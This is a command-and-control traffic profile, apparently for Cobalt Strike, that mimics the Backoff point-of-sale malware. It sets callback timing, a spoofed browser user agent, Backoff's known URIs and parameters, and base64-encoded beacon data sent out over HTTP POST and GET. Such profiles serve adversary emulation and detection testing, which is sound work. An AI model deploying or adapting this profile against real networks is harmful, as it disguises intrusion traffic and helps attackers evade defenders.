
set sample_name "Backoff POS Malware";

set sleeptime "30000"; # use a ~30s delay between callbacks
set jitter    "10";    # throw in a 10% jitter

set useragent "Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0";

# the relevant indicators
http-post {
	set uri "/windebug/updcheck.php /aircanada/dark.php /aero2/fly.php /windowsxp/updcheck.php /hello/flash.php";

	client {
		header "Accept" "text/plain";
		header "Accept-Language" "en-us";
		header "Accept-Encoding" "text/plain";
		header "Content-Type" "application/x-www-form-urlencoded";

		id {
			netbios;
			parameter "id";
		}

		output {
			base64;
			prepend "&op=1&id=vxeykS&ui=Josh @ PC&wv=11&gr=backoff&bv=1.55&data=";
			print;
		}
	}

	server {
		output {
			print;
		}
	}
}

# No information on backoff use of GET, so generic GET request.
http-get {
	set uri "/updates";

	client {
		metadata {
			netbiosu;
			prepend "user=";
			header "Cookie";
		}
	}

	server {
		header "Content-Type" "text/plain";

		output {
			base64;
			print;
		}
	}
}

